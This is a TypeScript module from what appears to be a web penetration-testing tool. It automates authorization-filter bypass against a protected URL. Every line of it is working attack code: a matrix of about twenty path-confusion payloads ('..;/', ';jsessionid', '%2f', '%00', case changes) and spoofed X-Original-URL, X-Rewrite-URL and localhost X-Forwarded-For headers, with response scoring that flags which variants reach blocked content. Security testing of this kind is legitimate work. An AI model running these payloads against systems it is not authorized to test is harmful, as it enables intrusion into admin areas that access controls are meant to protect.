import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";
import { charSimilarity, normalizeBody } from "./normalize.js";

/** Authorization-filter path confusion: front proxies (nginx/Apache) and the
 *  app container disagree about the normalized path, so the filter guards
 *  /admin while the app still routes the request. Matrix of dot-segments,
 *  matrix params, double slashes, encoded separators, NUL, case and
 *  X-Original-URL/X-Rewrite-URL headers. Calibrated against soft-404 and the
 *  real login response, so a hit means "content the filter should have
 *  blocked" — not just a non-redirect. */

export interface PathBypassInput {
  /** Protected path (the one that answers 302/401/403 without a session). */
  readonly protectedUrl: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
}

export type PathVerdict = "bypassed" | "probably" | "blocked" | "soft-404" | "unchanged";

export interface PathVariant {
  readonly name: string;
  readonly request: string;
  readonly status: number;
  readonly bytes: number;
  readonly similarityToDenied: number;
  readonly verdict: PathVerdict;
  readonly evidence: string;
}

export interface PathBypassResult {
  readonly denied: { status: number; bytes: number };
  readonly variants: PathVariant[];
  readonly bypassed: PathVariant[];
  readonly artifacts: { path: string; bytes: number }[];
}

const DENY_CODES = new Set([401, 403, 302, 307, 303]);
const LOGIN_MARKERS = /(sign in|log in|login|unauthorized|forbidden|access denied)/i;

const variantsFor = (path: string): { name: string; path: string; headers?: Record<string, string> }[] => {
  const p = path.startsWith("/") ? path : `/${path}`;
  return [
    { name: "trailing-slash", path: `${p}/` },
    { name: "dot-suffix", path: `${p}/.` },
    { name: "double-slash", path: `${p}//` },
    { name: "leading-double-slash", path: `/${p}` },
    { name: "dot-prefix", path: `/./${p.replace(/^\//, "")}` },
    { name: "matrix-suffix", path: `${p};` },
    { name: "matrix-jssession", path: `${p};jsessionid=x` },
    { name: "dotdot-semicolon", path: `${p}/..;/${p.replace(/^\//, "")}` },
    { name: "semicolon-prefix", path: `/;${p}` },
    { name: "encoded-slash", path: `${p}%2f` },
    { name: "encoded-dot-prefix", path: `/%2e${p}` },
    { name: "double-encoded-dot", path: `${p}%252e` },
    { name: "dotdot-suffix", path: `${p}..;/` },
    { name: "upper-case", path: p.toUpperCase() },
    { name: "null-suffix", path: `${p}%00` },
    { name: "encoded-dotdot", path: `${p}/..%2f${p.replace(/^\//, "")}` },
    { name: "header-x-original-url", path: p, headers: { "x-original-url": p } },
    { name: "header-x-rewrite-url", path: p, headers: { "x-rewrite-url": p } },
    { name: "header-x-forwarded-prefix", path: p, headers: { "x-forwarded-prefix": p } },
    { name: "header-localhost-xff", path: p, headers: { "x-forwarded-for": "127.0.0.1", "x-real-ip": "127.0.0.1" } },
  ];
};

export const probePathBypass = async (input: PathBypassInput): Promise<PathBypassResult> => {
  const target = new URL(input.protectedUrl);
  const origin = target.origin;
  const path = `${target.pathname}${target.search}`;
  const get = (url: string, headers?: Record<string, string>) => fetchUrl(url, {
    headers: { ...(input.headers ?? {}), ...(headers ?? {}) },
    maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10_000, maxBytes: 512 * 1024, cookie: input.cookie,
  });

  const denied = await get(input.protectedUrl);
  const soft = await fetchUrl(`${origin}/velric-soft404-${Date.now().toString(36)}`, { maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10_000, maxBytes: 256 * 1024 });
  const deniedNorm = normalizeBody(denied.body);
  const softNorm = normalizeBody(soft.body);

  const variants: PathVariant[] = [];
  for (const v of variantsFor(path)) {
    const r = await get(`${origin}${v.path}`, v.headers).catch(() => null);
    if (!r) continue;
    const norm = normalizeBody(r.body);
    const simDenied = denied.body ? charSimilarity(norm, deniedNorm) : 0;
    const simSoft = soft.body ? charSimilarity(norm, softNorm) : 0;
    let verdict: PathVerdict;
    let evidence: string;
    const ok = r.status >= 200 && r.status < 300;
    const softHit = simSoft >= 0.98 && r.status !== denied.status;
    if (softHit && !(ok && !LOGIN_MARKERS.test(r.body) && r.bytes > soft.bytes * 1.5)) {
      verdict = "soft-404"; evidence = `matches soft-404 (sim ${simSoft.toFixed(2)})`;
    } else if (ok && !LOGIN_MARKERS.test(r.body.slice(0, 4000)) && simDenied < 0.9) {
      verdict = "bypassed"; evidence = `${r.status}, ${r.bytes}B, ${simDenied < 0.5 ? "fully different" : "partly different"} from denial (sim ${simDenied.toFixed(2)})`;
    } else if (ok && simDenied < 0.9) {
      verdict = "probably"; evidence = `${r.status}, ${r.bytes}B but login-ish content still present`;
    } else if (r.status === denied.status && simDenied >= 0.98) {
      verdict = "unchanged"; evidence = `same verdict as baseline (${r.status})`;
    } else {
      verdict = "blocked"; evidence = `status ${r.status}, sim ${simDenied.toFixed(2)}`;
    }
    variants.push({ name: v.name, request: v.headers ? `${v.path} + ${Object.keys(v.headers).join(",")}` : v.path, status: r.status, bytes: r.bytes, similarityToDenied: Number(simDenied.toFixed(3)), verdict, evidence });
  }
  const bypassed = variants.filter((v) => v.verdict === "bypassed");
  const body = JSON.stringify({ protectedUrl: input.protectedUrl, denied: { status: denied.status, bytes: denied.bytes }, soft404: { status: soft.status, bytes: soft.bytes }, variants, bypassed }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, "path_auth_bypass.json", body);
  return { denied: { status: denied.status, bytes: denied.bytes }, variants, bypassed, artifacts: [artifact] };
};

void DENY_CODES;
